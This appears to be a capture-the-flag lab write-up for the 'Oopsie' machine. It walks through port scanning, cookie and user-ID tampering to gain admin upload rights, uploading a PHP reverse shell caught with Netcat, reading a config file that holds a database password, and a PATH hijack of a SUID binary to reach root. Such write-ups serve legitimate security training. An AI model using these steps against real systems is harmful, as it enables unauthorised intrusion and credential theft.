# [OK] - Oopsie

| Difficult: | Easy |
| --- | --- |
| OS: | Linux |
| Last edit: | 26/06/22 |

## Enumeration

The first task was collect information from the target. So, we execute the Nmap to collect the ports and services running in the target.

```bash
nmap -sV -sC 10.129.108.33 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 14:34 EDT
Nmap scan report for 10.129.108.33
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
**22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
**80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))**
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Access the web page on port 80/TCP via Web Browser:

![Untitled](pics/Untitled.png)

We will use the BurpSuite a proxy to intecept requests. With BurpSuite we identify a new path ‘/cdn-cgi/login/’ that access a login page.  Using the optin “Login as Guest”, we access the application with limitations. Navigating through the menu the update option calls attention. But the upload option is only available for the admin user.  Maybe if we bypass this rule, the upload function might be available.

![Untitled](pics/Untitled%201.png)

We need to find a way to escalate our privileges from user Guest to super admin role. One way to try this is by checking if cookies and sessions can be manipulated. As one can observe, there is
a role=guest and user=2233 which we can assume that if we somehow knew the number of super
admin for the user variable, we might be able to gain access to the upload page.

We check the URL on our browsers bar again where there is an id for every user:
[http://10.129.108.33/cdn-cgi/login/admin.php?content=accounts&id=2](http://10.129.108.33/cdn-cgi/login/admin.php?content=accounts&id=2)

![Untitled](pics/Untitled%202.png)

Change id 2 to 1 in URL, we have…

[http://10.129.108.33/cdn-cgi/login/admin.php?content=accounts&id=1](http://10.129.108.33/cdn-cgi/login/admin.php?content=accounts&id=1)

We found the “Admin User Acesses ID”, then we change this information on cookie to get the behavior when access the Upload menu again.

![Untitled](pics/Untitled%203.png)

The upload option is active. We will upload a reverse shell PHP. You can download here:

[php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![Untitled](pics/Untitled%204.png)

Using a Netcat opened port, we received the reverse shell from the application.

![Untitled](pics/Untitled%205.png)

We got a reverse shell! In order to have a functional shell though we can issue the following

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

![Untitled](pics/Untitled%206.png)

The user Robert is part of the group ***bugtracker*** . Let's try to see if there is any binary within
that group:

```bash
find / -group bugtracker
```

We found a file named ***bugtracker*** with SUID enable. This is GREAT!!

![Untitled](pics/Untitled%207.png)

When we run the file ***bugtracker*** we notice that the cat command is used to display a file in a certain in the report directory. But not this cat command makes use of the environment variable to locate the executable. So our task here is to change the cat environment variable to point to an executable containing a shell.

```bash
# Create new file cat with shell
echo '/bin/sh' > /tmp/cat

# Set execution permission
chmod +x /tmp/cat

# Set /tmp to environment variable
set PATH=/tmp:$PATH

# Execute ***bugtracker again
bugtracker***
```

Now we have a shell and can see the flag in:

`/bin/cat /root/flag.txt`

End!!tks
